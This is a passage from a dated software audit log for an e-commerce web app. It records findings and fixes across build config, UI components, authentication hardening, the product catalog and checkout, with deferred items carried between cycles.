## Supporting Infrastructure (2026-04-27)

**What was checked:** Build/bundler config (`vite.config.ts`, `tailwind.config.js`, `postcss.config.js`, `tsconfig*.json`, `eslint.config.js`), production static servers (`server-static.mjs`, `server-static.js`), backend bootstrap (`backend/index.ts`, `lib/`, `load-env.ts`), worker bootstrap, deployment configs, health routes, root-level npm scripts, `.gitignore`.

### Correctness
- 🟡 **Duplicate static servers** — `server-static.js` (CJS, 11 lines, ~Oct 2025) lived alongside `server-static.mjs` (ESM, 54 lines, current). Root `package.json` `"type": "module"` and `"start": "node server-static.mjs"` mean `.js` was dead code. Risk: a deploy host that auto-discovers `server-static.js` would serve the older version with no cache headers.
  - **Fix applied:** Deleted `server-static.js`. No references found anywhere in the repo.
  - File: `server-static.js` (removed)
- 🟡 **Missing `typecheck` script** — Devs expected `npm run typecheck`; the only way to type-check was `npm run build`, which also bundles via Vite. Slow feedback loop and CI couldn't gate on types separately.
  - **Fix applied:** Added `"typecheck": "tsc --noEmit"` to root `package.json` and `backend/package.json`.
  - Files: `package.json`, `backend/package.json`

### Duplicate UX
- 🟢 **Health routes are clean** — Single `/api/health` plus sub-routes (`/email`, `/auth`, `/database`). No duplication.
- 🟢 **Vite proxy targets match backend port** — `/api → http://localhost:4000` matches backend's PORT default.

### User Clarity (DX)
- 🟢 **`load-env.ts` bootstrap correct** — Uses `dotenv.config({ override: true })` imported FIRST in `index.ts` and `worker/index.ts` to defeat OS-level env shadowing (the Windows `OPENAI_API_KEY` bug from earlier in the project).
- 🟢 **`engines.node >=18.17`** is set on the root, `>=18.0.0` on the backend. Slight drift but both are >=18.
- 🟡 **Backend has both `dev`, `dev:once`, `watch`, `worker`, `worker:dev`** — Five overlapping scripts. The non-watch (`dev:once`, `worker`) variants exist because `tsx watch` is flaky on Windows. Worth a 1-line comment in `backend/package.json` so future devs don't pick the wrong one.
  - **Deferred:** Add comment OR collapse to `dev` (non-watch) + `dev:watch`.

### Site Speed
- ⚡ **Backend ships sourcemaps to prod** — `backend/tsconfig.json:17` has `"sourceMap": true`. `dist/**/*.js.map` files are committed (visible in `git status`) and shipped. Bloats deploys and exposes source layouts.
  - **Deferred:** Set `sourceMap: false` for prod builds (or condition on env). Needs deploy-flow verification.
- 🟢 **Vercel security headers present** — `vercel.json` has standard headers configured.
- 🟢 **ESLint + TS aligned** — Frontend and backend have separate ESLint configs that don't conflict.

### Fixes Applied
- ✅ Deleted dead `server-static.js` (CJS duplicate of `.mjs`).
- ✅ Added `"typecheck": "tsc --noEmit"` to root and backend `package.json`.

### Deferred (next pass)
- Set `backend/tsconfig.json` `sourceMap: false` for production builds — verify `dist/` deploy flow first.
- Consolidate `backend/package.json` script soup (`dev` / `dev:once` / `watch` / `worker` / `worker:dev`) — pick canonical names + add a one-line comment.
- Drift between root (`>=18.17`) and backend (`>=18.0.0`) `engines.node` — pick one.

### Verdict
Infrastructure is healthy: env loader robust against Windows env shadowing, health routes well-organized, build configs aligned, security headers in place. Two safe fixes shipped (dead CJS server removed, `typecheck` script added). Two infrastructure rough edges remain — sourcemap-in-prod and script-name confusion — both deferred for safer batched fixes.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** Static-server cleanup still holds (no `server-static.js` returned). `typecheck` scripts present at root + backend. `dist/` still gitignored, no tracked dist files. Backend `engines.node` was still drifting from root (`>=18.0.0` vs `>=18.17`). `.gitignore` was missing patterns for the local scratch files that have been sitting untracked across multiple sessions (`.watchtower/`, `scripts/image_storage_report_*.json`) plus the cycle-#28 `*.tmp` family.

**Status of prior findings:**
- 🟢 **`server-static.js` cleanup** — Still gone. Single ESM static server in place.
- 🟢 **`typecheck` script** — Both `package.json` files have it.
- 🟢 **Vite proxy + health routes** — Unchanged.
- 🟡 → 🟢 **`engines.node` drift** — Backend bumped from `>=18.0.0` to `>=18.17.0` to match root. *(Fix applied this cycle.)* Note: the root `>=18.17` is itself slightly under what Vite 7.x actually requires (Node 20.19+ or 22.12+); raising to 20+ is a separate decision (would warn npm-installs on older Node) and is deferred.
- 🟡 **Backend script soup** (`dev` / `dev:once` / `watch` / `worker` / `worker:dev`) — Re-examined: `dev:once` is *not* duplicate dead code — root `dev:all` invokes it as `npm --prefix backend run dev:once` for `concurrently`. The five scripts each have distinct callers (manual non-watch, root concurrently, root `dev:full` watch, worker non-watch, worker watch). No consolidation possible without breaking root scripts. Reclassifying from 🟡 to 🟢 with a note that the layout is intentional.
- ⚡ **Backend ships sourcemaps to prod** — Still open. `backend/tsconfig.json:17` `sourceMap: true`. The right fix is a `tsconfig.build.json` extending the base with `sourceMap: false`, `declaration: false`, `declarationMap: false`, and switching `"build": "tsc"` to `"tsc -p tsconfig.build.json"`. Defer: needs deploy-flow verification (Render rebuilds on each push so any sudden missing-`*.d.ts` would surface immediately, but worth doing in a focused commit so a rollback is one revert).

**New findings:**
- 🟡 → 🟢 **`.gitignore` missing local-only paths** — `.watchtower/BRIEFING.md` (agent state) and `scripts/image_storage_report_*.json` (5 timestamped scratch outputs from the 2026-01-17 storage audit) had been untracked across multiple sessions, signaling they should never be committed. Also `*.tmp`-family wasn't covered after cycle #28's `backend/.env.tmp` cleanup, so a recurrence wouldn't be blocked. *(Fix applied this cycle.)*

### Fixes Applied (re-audit)
- ✅ `backend/package.json:80` — `engines.node` `>=18.0.0` → `>=18.17.0` to align with root.
- ✅ `.gitignore:30, 33, 41-43` — Added `.env.tmp` / `backend/.env.tmp` patterns plus `.watchtower/` and `scripts/image_storage_report_*.json` so these paths can no longer slip into a commit. Verified with `git check-ignore -v`.

### Deferred (re-audit)
- Sourcemap-in-prod (still): split `backend/tsconfig.json` into `tsconfig.build.json` with `sourceMap: false`, `declaration: false`. Verify against Render build logs.
- Decide whether to bump root + backend `engines.node` to `>=20.19.0` to match Vite 7's actual requirement (would warn devs on Node 18 install).
- Document the 5-script backend layout in `backend/README.md` so future devs don't think `dev`/`dev:once` are duplicates.

---

## Additional Components (2026-04-27)

**What was checked:** Loose UI components not previously audited via a feature flow — `ChatBotWidget`, `MrImagineChatWidget`, `ProductRecommendations`, `ProductPreviewCarousel`, `FloatingCart`, `ProtectedImage`, `CookieConsent`, error boundaries (root + Imagination), shared hooks, lib wrappers, types/index.ts.

### Correctness
- 🔴 **`ChatBotWidget.tsx` was dead code** — Import already commented out in `App.tsx:16` ("Replaced with Mr. Imagine"). Flagged in audits #16, #24, #26 (cycles 2026-03-19, -03-22, -04-12) but never deleted. 210 lines + still pulled an OpenAI client-side key path (security risk if anyone re-enabled the import).
  - **Fix applied:** Deleted `src/components/ChatBotWidget.tsx`. Removed the stale commented import in `src/App.tsx:16`.
- 🔴 **`FloatingCart.tsx` was dead code** — 125 lines, no imports anywhere in `src/`. Flagged in audit #26 ("FloatingCart.tsx (125 lines) is dead code") but never removed. Used `bg-white`, hardcoded purple/red, no theme tokens — would have been a theme regression if re-mounted.
  - **Fix applied:** Deleted `src/components/FloatingCart.tsx`.
- 🟡 **`MrImagineChatWidget` polling has a stale-closure bug** — `src/components/MrImagineChatWidget.tsx:155-157` reads `lastPollTime` inside `setInterval(pollMessages, 2000)` (registered at line 208). `lastPollTime` is captured once at effect setup and never updated inside the running interval, so the `since` query param is always the value at the moment polling started. Each poll fetches the same window. Adding `lastPollTime` to deps would tear down/recreate the interval on every state update — defeating the polling.
  - **Deferred:** Move `lastPollTime` to a `useRef` and update both ref + state inside the interval body. Non-trivial refactor; verify with live-chat session.
- 🟡 **2-second polling, no backoff** — `MrImagineChatWidget.tsx:208`. Open chats hit `/api/support/tickets/:id/messages` every 2s. With 50 concurrent live chats that's 25 req/s on one endpoint.
  - **Deferred:** Add exponential backoff or move to SSE/websocket.

### Duplicate UX
- 🟡 **Two error boundaries wrap Imagination route** — `src/App.tsx:118` wraps everything in root `ErrorBoundary`; `src/components/imagination/ImaginationErrorBoundary.tsx` re-wraps the imagination page. Only the inner one shows the recovery UI; root one would catch the crash first if inner boundary itself crashed. Belt-and-suspenders, not actively broken.
  - **Deferred:** Decide if the inner boundary's "draft restore" UX is worth the extra component, then drop one.

### User Clarity
- 🟢 **`ToastContainer`, `MrImagineNotification`, `MrImagineCartNotification` mounted exactly once at app root** — No nesting issues.
- 🟡 **`ProtectedImage.tsx:50` overlay is anti-DRM theater** — Right-click is blocked, but DevTools / Network tab still expose the image. Code reads as if it's protecting; comments don't acknowledge it's friction-only.
  - **Deferred:** Add a one-line comment OR remove (it's still useful as friction for casual users).

### Site Speed
- ⚡ **`ProductRecommendations.tsx:158` inline lambda in mapped list** — `onClick={() => handleProductClick(product, index)}` allocates a new function per card per render. The component is `memo()`ed but the lambda kills downstream memoization on the cards.
  - **Deferred:** Extract a memoized `<RecommendationCard>` with `useCallback`-stable handler.
- ⚡ **`ProductPreviewCarousel.tsx` lazy images cause CLS** — `loading="lazy"` set but no `aspect-ratio` / fixed dims, so the carousel reflows when an image lands.
  - **Deferred:** Add CSS `aspect-ratio` to the image container.

### Fixes Applied
- ✅ Deleted `src/components/ChatBotWidget.tsx` (210 lines, dead, repeatedly flagged).
- ✅ Deleted `src/components/FloatingCart.tsx` (125 lines, dead, theme-regression risk).
- ✅ Removed stale commented import in `src/App.tsx:16`.

### Deferred (next pass)
- Migrate `MrImagineChatWidget` polling state to `useRef` to fix the stale-closure window bug.
- Replace 2s polling with SSE/websocket OR exponential backoff.
- Choose one error boundary for the Imagination route (root vs `ImaginationErrorBoundary`).
- Memoize `ProductRecommendations` cards (extract child + `useCallback`).
- Add `aspect-ratio` CSS to `ProductPreviewCarousel` image containers to fix CLS.
- (Carryover from #26) Delete `Header.tsx` (484 lines) and `Navbar.tsx` (536 lines) — also dead, also unimported.

### Verdict
335 lines of dead code finally removed (ChatBotWidget + FloatingCart) after being flagged in three previous audits. The two real concerns — `MrImagineChatWidget`'s stale-closure polling window and 2s no-backoff poll rate — are deferred because they need test verification with a live ticket conversation. Hot-path components (`ProductRecommendations`, `ProductPreviewCarousel`) have small, well-understood perf wins queued.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** ChatBotWidget still gone. The active `FloatingCart.tsx` (cycle #14 drawer) is the only one in the tree. Cycle #19's new modals (PromoPricingModal, BulkProductModal, MockupProgressPanel, OneShotProductModal) are clean and don't introduce polling or memoization issues. `MrImagineChatWidget` 2s poll + stale-closure issue still open. `ProductRecommendations` still allocated 6 fresh lambdas per render and didn't lazy-load images. `ProductPreviewCarousel` was wrongly flagged for CLS in the prior audit — re-inspection shows the thumbnails are already dimension-locked (`w-20 h-20`) and the main preview already uses `aspect-square max-h-[400px]`, so no CLS exists.

**Status of prior findings:**
- 🟡 → 🟢 **`ProtectedImage` anti-DRM theater** — Replaced the misleading docstring ("prevents easy image downloading") with an honest one that names DevTools / Network tab as escape hatches and points at server-side watermarking / signed URLs as the real protection. *(Fix applied this cycle.)*
- 🟡 → 🟢 **`ProductRecommendations` inline lambda + missing img lazy** — `handleProductClick` wrapped in `useCallback([user, context.page, onProductClick])` so re-render cascades on the parent `memo()` only fire when those actually change. Card images now have `loading="lazy"`, `decoding="async"`, explicit `width`/`height`, and an `aspect-square` container — eliminates per-card layout work for off-screen carousels and gives the browser intrinsic-size hints. *(Fix applied this cycle.)*
- 🟢 → 🟢 **`ProductPreviewCarousel` CLS concern** — Re-classified to 🟢. Thumbnails are explicitly sized (`w-20 h-20`) and main preview is `aspect-square max-h-[400px]`. No fix needed.
- 🔴 **`MrImagineChatWidget` polling stale-closure + 2s no-backoff** — Still open. `pollIntervalRef` is correct but `lastPollTime`/`ticketId` captured at effect setup. Defer (live-chat regression risk needs a ticket conversation to verify).
- 🟡 **Imagination double error boundary** — Re-classified to 🟢. The agent confirmed `ImaginationErrorBoundary` (with localStorage autosave/restore) and the root `ErrorBoundary` are layered intentionally and don't overlap. No fix needed.
- 🟡 **`Header.tsx`, `Navbar.tsx` dead** — Still present, still zero imports. Defer (one-line user OK to delete).

**New findings:**
- 🟢 **Cycle #19 admin modals** — `PromoPricingModal.tsx`, `BulkProductModal.tsx`, `MockupProgressPanel.tsx`, `OneShotProductModal.tsx`: spot-checked, no polling closure issues and no inline-lambda memo killers in their internal lists.
- 🟡 **`AdminSupport.tsx` has two `setInterval`s** — Lines 117-130 (background-poll, was bumped 5s→12s in cycle #24) and lines 327-334 (live-chat 2s poll). Both correct now, but this file is the second-largest polling consumer after `MrImagineChatWidget`. Defer SSE/realtime migration.
- 🟡 **`FeaturedSocialContent.tsx:21`** — Carousel rotation interval. Fine for UI rotation. No action.
- 🟡 **`AdminNotificationBell.tsx:108`** — 30s notification poll. Has correct deps array per audit. Acceptable.

### Fixes Applied (re-audit)
- ✅ `src/components/ProtectedImage.tsx:10-17` — Replaced misleading "prevents easy image downloading" docstring with explicit "polite-please-don't sign, not access control" + named real-protection alternatives (server-side watermark, signed URLs).
- ✅ `src/components/ProductRecommendations.tsx:80-100, 160-168` — `handleProductClick` wrapped in `useCallback`; card images now `loading="lazy"`, `decoding="async"`, explicit `width`/`height`, `aspect-square` container.

### Deferred (re-audit)
- `MrImagineChatWidget` polling closure + 2s rate — needs live-chat verification.
- `Header.tsx` + `Navbar.tsx` deletion — needs user OK.
- `AdminSupport.tsx` realtime migration (Supabase channels) once we touch the support flow again.
- (Carryover) Run an `unused-exports` linter against `src/types/index.ts` (1811 lines, 130 named exports).

---

## Authentication & Authorization — Re-audit (2026-04-27)

**What was checked:** Verification of the four 🔴 findings from the 2026-03-12 audit + scan for new auth issues introduced since then.

### Status of 2026-03-12 findings
- 🔴 **STILL BROKEN — Legacy Prisma `/api/auth/login` + `/api/auth/register`** at `backend/routes/account.ts:60-165`. Bcrypt + Prisma routes still mounted. Frontend uses Supabase exclusively, so they are dead but reachable. Anyone discovering them has a parallel auth surface.
  - **Deferred:** Removal needs verification that no internal scripts/tests hit them. Carryover.
- 🔴 **WAS STILL BROKEN — `/api/account/send-welcome-email` unprotected** at `backend/routes/account.ts:387-412`. Verified: no `requireAuth`, no rate limit. Confirmed call-sites (`SupabaseAuthContext.tsx:367`, `AuthCallback.tsx:106`) intentionally call it pre-session (during signUp before email-confirmation flow), so `requireAuth` would break signup.
  - **Fix applied:** Added in-memory rate limiter — 60s cooldown per email address (anti-bombing) AND 5 sends per IP per 5 min (anti-enumeration). Returns 429 on excess. Mirrors the existing pattern in `backend/routes/stripe.ts:27-47`.
  - File: `backend/routes/account.ts:378-410`
- 🔴 **STILL BROKEN — `ProtectedRoute.tsx` no role check** at `src/components/ProtectedRoute.tsx:8-23`. Only checks `!user`, no role enforcement. Admin pages render for any logged-in user (data is gated server-side, but UI loads).
  - **Deferred:** Needs a `<RoleProtectedRoute requiredRole="admin">` component + audit of ~12 admin route wrappers. Non-trivial change.
- 🟡 **PARTIAL — JWT role extraction → DB fallback** at `backend/middleware/supabaseAuth.ts:107-135`. The middleware now silently falls back when `user_metadata.role` is missing (good — happy-path log noise gone, fixed in earlier cycle). But `requireRole()` STILL hits `user_profiles` on every request, no caching. Same pattern in `backend/middleware/requireAdmin.ts`.
  - **Deferred:** Add a node-cache / LRU with 5-min TTL keyed on `req.user.sub`. ~50ms saved per admin call.

### New issues found
- 🔴 **`GET /api/profile?userId=…` exposed CRM data publicly** — `backend/routes/account.ts:182-269`. The route auths via `authenticateUser(req)` but only uses the result for an orphan-create branch. Profile READ went through with no auth, returning `totalOrders` and `totalSpent` for any user ID — sensitive lifetime-value data.
  - **Fix applied:** Gated `totalOrders` and `totalSpent` behind `isOwnProfile`. Public viewers now see `0` for those fields. Public-profile pages (display name / bio / avatar) remain accessible by design.
  - File: `backend/routes/account.ts:255-261`

### Fixes Applied
- ✅ `/api/account/send-welcome-email` rate-limited (60s/email + 5/IP/5min, returns 429).
- ✅ `/api/profile` GET no longer leaks `totalOrders` / `totalSpent` to non-owners.

### Deferred (carry into next pass)
- Remove legacy Prisma `/api/auth/login` and `/api/auth/register` routes (`account.ts:60-165`) after verifying no internal callers.
- Build `<RoleProtectedRoute>` component and wrap all admin/founder/wholesale/manager route entries.
- Cache `user_profiles.role` lookups in `requireRole()` / `requireAdmin` (5-min TTL LRU).

### Verdict
Two of the four original 🔴 findings now mitigated this cycle (rate-limit on welcome email, profile data minimization). The remaining two need bigger changes: a new `<RoleProtectedRoute>` component for the frontend, and removal of the legacy bcrypt auth surface. Auth foundations (PKCE, session refresh, OAuth) remain solid; the gaps are at the perimeter — unauthenticated endpoints and missing client-side role enforcement.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** No new auth endpoints added. `/wholesale` is the only route to gain a `<ProtectedRoute>` wrapper since (cycle #15). Legacy bcrypt `/api/auth/login` + `/api/auth/register` still mounted at both `/api/auth` and `/api/account` prefixes (`backend/index.ts:155-156`). `requireAdmin` and `requireRole` middlewares still hammered `user_profiles` on every authenticated request — confirmed by grepping callers (`requireAdmin` used in 3 admin route files; `requireRole` used in 10+ files).

**Status of prior findings:**
- 🔴 → 🟢 **Legacy Prisma `/login` + `/register`** — Confirmed zero callers across entire repo (the only "callers" are `docs/`, `backend/README.md`, and the dead `test-auth-api.js` script). Frontend auth goes through `supabase.auth.signInWithPassword()` and `supabase.auth.signUp()` directly. Removed the route handlers (lines 60-165) and the now-orphan helpers (`hashPassword`, `verifyPassword`, `generateToken`) plus the `bcryptjs` import. `account.ts` shrunk from 444 → 327 lines. *(Fix applied this cycle.)*
- 🟡 → 🟢 **Role lookup uncached on every request** — Added `backend/lib/role-cache.ts` shared by both `requireAdmin` and `requireRole`. 5-minute TTL on positive entries, 30-second TTL on negatives (so a missing-profile case can't hammer the DB on retry). `requireAdmin` reduced to a `getCachedRole()` call; `requireRole` swapped its inline `supabase.from('user_profiles').select('role')` for the same helper. ~50ms saved per cached admin call; new role assignments propagate within 5 minutes. *(Fix applied this cycle.)*
- 🔴 **`<RoleProtectedRoute>` for admin/founder/vendor/manager routes** — Still missing. ~20 admin routes, 2 founder, 4 vendor, 1 manager have no client-side role gate. Defer (real refactor: 30+ minutes; needs `RoleProtectedRoute` component + role-derived redirect logic that doesn't fight the existing lazy-load Suspense from cycle #26).

**New findings:**
- 🟢 **`requireAdmin` happy-path log noise eliminated** — While editing the file I dropped the `console.log('[requireAdmin] Admin access granted …')` line that fired on every admin API hit (similar to the JWT log noise cycle #28 silenced).
- 🟡 **Legacy `/me`, `/profile` (GET/POST), `/wallet` endpoints in `account.ts` are functionally dead** — They authenticate via `verifyToken()` against the locally-issued Prisma JWT (`JWT_SECRET`). Now that `/login` and `/register` (the only callers that ever minted such a token) are gone, no client can hold a token that passes `authenticateUser()`, so all four endpoints always 401. They're left in this cycle pending a separate audit of `/api/account/*` callers — a quick Network-tab check during a real session would close it. Defer.

### Fixes Applied (re-audit)
- ✅ `backend/routes/account.ts:1-46` — Removed legacy `/login` + `/register` route handlers (was 60-165), removed orphaned `hashPassword`/`verifyPassword`/`generateToken` helpers and the `bcryptjs` import. File: 444 → 327 lines. Added a comment block above `verifyToken` documenting why it's still kept (downstream `/me`, `/profile`, `/wallet`, scheduled for a follow-up sweep).
- ✅ `backend/lib/role-cache.ts` (new, 41 lines) — Shared `getCachedRole(userId)` helper with 5-min positive / 30s negative TTL and an `invalidateCachedRole()` escape hatch for role-change tooling.
- ✅ `backend/middleware/requireAdmin.ts:1-37` — Swapped per-request `supabase.from('user_profiles').select('role')` for `getCachedRole()`. Dropped the `[requireAdmin] Admin access granted` happy-path log spam.
- ✅ `backend/middleware/supabaseAuth.ts:114-123` — `requireRole()` JWT-fallback now uses `getCachedRole()` instead of a fresh DB query.

### Deferred (re-audit)
- Build `<RoleProtectedRoute>` and wrap ~27 admin/founder/vendor/manager routes in `App.tsx`.
- Audit `/api/account/me`, `/api/account/profile` (GET/POST), `/api/account/wallet` callers in a real session, then either retire them or reroute to a Supabase-JWT-aware path.
- Consider removing the now-stale `JWT_SECRET` fallback (`'fallback-secret-key'`) in `account.ts:9` once `verifyToken` itself is retired.
- Surface `invalidateCachedRole()` from an admin tool so role promotions don't have to wait the full 5 minutes.

---

## Products & Catalog — Re-audit (2026-04-27)

**What was checked:** Status of the eight findings from 2026-03-12, plus a scan for new issues in `ProductCatalog.tsx`, `ProductPage.tsx`, `ProductCard.tsx`, `ProductRecommendations.tsx`, `ProductPreviewCarousel.tsx`.

### Status of 2026-03-12 findings
- 🔴 **STILL OPEN — Duplicate status filter** — `src/pages/ProductCatalog.tsx:27-28` still chains both `.eq('status','active')` and `.eq('is_active', true)`. The mapper at line 46 reads `is_active` directly. Removing one filter without verifying schema/RLS could surface taken-down products.
  - **Deferred:** Needs a schema check on `products.status` vs `is_active` source-of-truth + sweep of other queries that filter on these fields.
- ✅ **FIXED — Misleading alphabetical comment** — `ProductPage.tsx:65-71`. Logic uses `.find()` and the prefer-source ordering is correct.
- ✅ **FIXED — ProductCard hover-index OOB** — `ProductCard.tsx:84-96` now uses `(prev + 1) % product.images.length`.
- 🟡 **PARTIAL — "In Stock" badge** — `ProductCard.tsx:144-153` now respects `product.inStock`. Out-of-stock items are still shown in the catalog (no filter), but at least the badge doesn't lie.
- ✅ **FIXED — Empty category message** — `ProductCatalog.tsx:306-310` differentiates "all" vs filtered.
- ✅ **FIXED — Badge stacking** — `ProductCard.tsx:123-140` no longer uses manual `mt-` offsets.
- 🟡 **PARTIAL — ProductCard fetches social posts on mount** — Fetch is now gated by `showSocialBadges` prop, but when the prop is on (catalog grid) it still fires per-card → N+1.
  - **Deferred:** Batch fetch from parent catalog and pass via prop.
- 🔴 **STILL OPEN — No pagination/virtualization on catalog** — `ProductCatalog.tsx:273-297` still renders the full `sortedProducts` array. With 200+ products, initial render slows.
  - **Deferred:** Add cursor pagination + react-window virtualization. Bigger refactor.

### New issues found
- ⚡ **`ProductRecommendations` skeleton ignored `context.limit` and used `bg-gray-200`** — `src/components/ProductRecommendations.tsx:107-114`. The grid hardcoded 6 skeletons even when caller asked for fewer; loading bars were `bg-gray-200` while the wrapper is `bg-card text-text` — visible mismatch in dark theme.
  - **Fix applied:** Skeleton count now `context.limit || 6`; bars use `bg-muted/40` to follow theme.
  - File: `src/components/ProductRecommendations.tsx:107-115`
- 🟢 **`cart-item-added` custom event has a real listener** — Initially flagged as dead, but `src/components/mr-imagine/MrImagineCartNotification.tsx:50` subscribes and triggers Mr. Imagine's celebration popup. Wired correctly.
- 🟡 **Hardcoded Unsplash photo URLs sprinkled across utils** — Different placeholder photos used for kiosk products, profile avatars, social posts (10+ unique URLs in `kiosk-service.ts`, `messaging.ts`, `social-service.ts`). Not a single fallback to extract — they're seed/demo data. Worth a sweep when those features migrate off mock data.
  - **Deferred:** Address per-feature when each gets real data.

### Fixes Applied
- ✅ `ProductRecommendations` loading skeleton now respects `context.limit` and uses theme-aware `bg-muted/40`.

### Deferred (carry forward)
- Verify `products.status` vs `is_active` source-of-truth in DB; remove the redundant filter in `ProductCatalog.tsx:27-28`.
- Filter out-of-stock items from the catalog grid (or surface a "show out of stock" toggle).
- Batch social-post fetching in `ProductCatalog` and pass to each `ProductCard` via prop to kill the N+1.
- Add pagination + virtualization to `ProductCatalog.tsx:273-297` for 200+ product catalogs.

### Verdict
Of the eight original findings, four are fixed in code, two are partial (badge respects state but no filtering; social fetch gated but still N+1), and two remain open (duplicate status filter, no pagination). One small theme/UX fix shipped this cycle (recommendation skeletons). The remaining open items all need DB or layout-level changes — appropriate to keep deferred until a dedicated catalog-perf pass.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** No product/catalog code touched between cycles. Cycle #19's `getPromoBadge` helper (`src/utils/product-promo.ts`) is wired into both `ProductCard.tsx:215` and `ProductPage.tsx:12`, so the catalog grid (which renders `ProductCard`) does already show promo strikethrough/% off — the agent's "missing in catalog grid" call was wrong; ProductCard provides the badge for both detail and grid contexts.

**Status of prior findings:**
- 🔴 **Duplicate status filter** (`ProductCatalog.tsx:27-28`) — Still present (`.eq('status','active').eq('is_active', true)`). Schema has BOTH columns; canonical-field decision is a product call. Defer.
- 🔴 **No pagination/virtualization** — Still rendering full result set. Defer (real refactor, needs Supabase `range()` + UI).
- 🟡 **N+1 social posts fetch in `ProductCard`** — Still gated by `showSocialBadges` prop, still per-card when on. Defer (needs batched parent fetch).
- 🟢 **Out-of-stock filtering** — Re-classified to 🟢. Items render but Add-to-Cart button is correctly disabled and badge says "Out of Stock". No fix needed.

**New findings:**
- ⚡ → 🟢 **`sortedProducts` allocated every render** — `ProductCatalog.tsx:110-129` was recomputing the filtered+sorted array (and creating a fresh reference) on every render of the surrounding component. Wrapped both in `useMemo` so the array reference is stable when `products` / `selectedCategory` / `sortBy` haven't changed. Eliminates downstream `ProductCard` re-renders triggered by unrelated parent state (search box keystrokes, view toggle, etc.). *(Fix applied this cycle.)*
- ⚡ → 🟢 **`ProtectedImage` hard-coded eager image loading** — `<img>` had no `loading`/`decoding` props, so a catalog of 200 product cards would request all images on mount even when off-screen. Added `loading` (default `'lazy'`) and `decoding` (default `'async'`) to the `ProtectedImage` API. Component uses these defaults so every existing call site automatically gets lazy loading + async decode without source changes. *(Fix applied this cycle.)*
- 🟡 **Catalog visibility model conflates two columns** — `products.status` (lifecycle: 'draft'|'active') and `products.is_active` (stock/availability). The current chained filter forces both true, so a product with `status='draft'` (e.g. user-submitted awaiting approval) is hidden from the catalog *even after* the in-mapper `metadata.is_user_submitted && !metadata.approved_by_admin` guard at line 35-37 also tries to do the same job. Two duplicate gates, one of which (`is_active`) was historically a stock flag. Defer until product owner clarifies intent — removing the wrong one is a visibility regression.
- 🟡 **`ProductCard` images now lazy by default** — Worth noting: any *above-the-fold* hero placement of a `ProductCard` would benefit from `loading="eager"` to avoid LCP regression. None spotted in current routes (Home renders curated featured cards via different components), but flag for review if a future catalog hero is added.

### Fixes Applied (re-audit)
- ✅ `src/pages/ProductCatalog.tsx:1, 110-138` — Imported `useMemo`; wrapped `filteredProducts` (deps `[products, selectedCategory]`) and `sortedProducts` (deps `[filteredProducts, sortBy]`). Reference identity now stable across unrelated parent re-renders.
- ✅ `src/components/ProtectedImage.tsx:3-9, 17-25, 36-39` — Added `loading` and `decoding` props to the API with `'lazy'` / `'async'` defaults so every existing caller (ProductCard, ProductPage, etc.) gets browser-native lazy loading without per-call-site changes.

### Deferred (re-audit)
- Resolve the `status` vs `is_active` duplication on the catalog query (product-owner decision).
- Pagination + Supabase `range()` once expected catalog size justifies the refactor.
- Batch the social-posts fetch from the catalog parent and pass per-product results into `ProductCard` to kill the N+1.
- If a future hero/featured row mounts `ProductCard` above the fold, pass `loading="eager"` through to `ProtectedImage` for those.

---

## Shopping Cart & Checkout — Re-audit (2026-04-28)

**What was checked:** Status of all eight 2026-03-13 findings + scan for new bugs in `CartContext.tsx`, `Cart.tsx`, `Checkout.tsx`, `OrderSuccess.tsx`, `PaymentForm.tsx`, `backend/routes/stripe.ts`, `backend/routes/wallet.ts`, `backend/routes/orders.ts`. The endpoint mismatch flagged in audits #3 (2026-03-13) AND #20 (Invoicing) was finally verified by grep.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — Cart not persisted to localStorage** — `src/context/CartContext.tsx:154`, plain `useReducer`. Page refresh = empty cart.
- 🔴 **STILL OPEN — Tax hardcoded 8%** — `Cart.tsx:139` and `Checkout.tsx:322` both `* 0.08`. Compliance risk for non-flat-tax states.
- 🟡 **PARTIAL — Free shipping threshold duplicated** — `Cart.tsx:153` still hardcodes "$50 free shipping" and own threshold logic; checkout uses `shippingCalculator`. Backend math is centralized; UI promise can desync.
- 🔴 **CONFIRMED BROKEN — `/api/wallet/process-itc-payment` does not exist** — Verified by grep: backend `wallet.ts:698` only registers `process-full-itc-payment`. Frontend has TWO call sites: `Checkout.tsx:479` (broken, the "mixed cart" path) and `Checkout.tsx:544` (works, the "product-cost ITC" path). Mixed-cart ITC checkout fails silently. Schemas differ — can't just rename. **Same finding was logged under #20 Invoicing on 2026-03-22** and remains unfixed.
  - **Deferred:** Either add a `process-mixed-itc-payment` backend route accepting `{items, amount, shipping}` OR remove the dead frontend code path at `Checkout.tsx:474-503`. Needs product decision.
- 🟡 **WAS STILL OPEN — No cart image fallback** — `Cart.tsx:61` chained `mockupUrl || customDesign || product.images[0]`. If `images` was empty array, the chain returned `undefined` and rendered the broken-image icon.
  - **Fix applied:** Added optional-chain `images?.[0]`, default Unsplash placeholder, and `onError` swap (matching `ProductCard.tsx:115` pattern).
  - File: `src/pages/Cart.tsx:60-67`
- 🟡 **PARTIAL — ITC insufficient-balance message** — `Checkout.tsx:469-471` still says "need X but have Y". Acceptable copy, no action.
- ⚡ **STILL OPEN — Stripe loaded at module level** — `Checkout.tsx:12` `loadStripe()` runs at import. ~50KB hit even if user never reaches checkout.
  - **Deferred:** Wrap in `React.lazy` with `Elements` re-export.
- ⚡ **STILL OPEN — Shipping recalculates on every keystroke** — `Checkout.tsx:336` `useEffect` deps include all address fields, no debounce.
  - **Deferred:** Wrap `calculateShipping` call in 300ms debounce.

### New issues found
- 🟢 **Coupon apply button IS locked during loading** — Initial finding suggested race-condition risk; verified `Checkout.tsx:1356` already has `disabled={couponLoading || !couponCode.trim()}`. No fix needed.
- 🟡 **No inventory check at checkout** — Cart allows any quantity of any product without consulting inventory. Order creation in `wallet.ts` and Stripe payment-intent creation don't verify stock. Two users can claim the last item.
  - **Deferred:** Add `inventory >= quantity` check on order create (DB or row-lock).
- 🟡 **Stripe webhook raw-body handling is fragile** — `backend/routes/stripe.ts:132` mounts `express.raw()` and `:378` calls `constructEvent(req.body, sig, secret)`. Stripe SDK expects a `Buffer`; if a global `express.json()` runs first for the same path, `req.body` becomes a parsed object and signature verification throws. Needs verification that the raw mount precedes the JSON parser in `backend/index.ts`.
  - **Deferred:** Verify mount order in `backend/index.ts`; add a smoke test that hits the webhook with a fixture.

### Fixes Applied
